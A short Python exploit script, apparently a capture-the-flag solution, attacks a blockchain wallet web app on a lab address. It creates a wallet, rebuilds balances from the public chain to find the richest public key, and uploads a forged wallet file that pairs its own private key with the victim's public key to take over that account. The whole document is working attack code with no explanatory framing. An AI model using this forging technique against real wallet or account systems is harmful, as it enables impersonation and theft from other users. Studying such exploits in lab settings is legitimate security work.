#!/usr/bin/env python3
import html
import json
import re
from collections import defaultdict

import requests

BASE = "http://10.129.40.23:8080"
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0"

# Create a legitimate local private key.
response = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "create", "filename": "fresh"},
    timeout=20,
)
response.raise_for_status()
fresh_wallet = response.json()

# Reconstruct balances from the public chain.
chain = session.get(f"{BASE}/blockchain", timeout=20).json()
balances = defaultdict(int)

for block in chain:
    for transaction in block.get("data", []):
        if not isinstance(transaction, dict) or "amount" not in transaction:
            continue

        amount = int(transaction["amount"])
        sender = transaction.get("sender")
        receiver = transaction.get("receiver")

        if receiver:
            balances[receiver] += amount
        if sender and sender != "Blockchain_Reward":
            balances[sender] -= amount

vip_public_key, vip_balance = max(balances.items(), key=lambda item: item[1])
assert vip_balance >= 10, "No VIP-capable historical wallet found"

forged_wallet = {
    "private_key": fresh_wallet["private_key"],
    "public_key": vip_public_key,
}

response = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "load"},
    files={
        "file": (
            "forged_wallet.json",
            json.dumps(forged_wallet),
            "application/json",
        )
    },
    timeout=20,
)
response.raise_for_status()
assert "Wallet loaded successfully" in response.text

print(f"VIP wallet loaded (balance={vip_balance})")
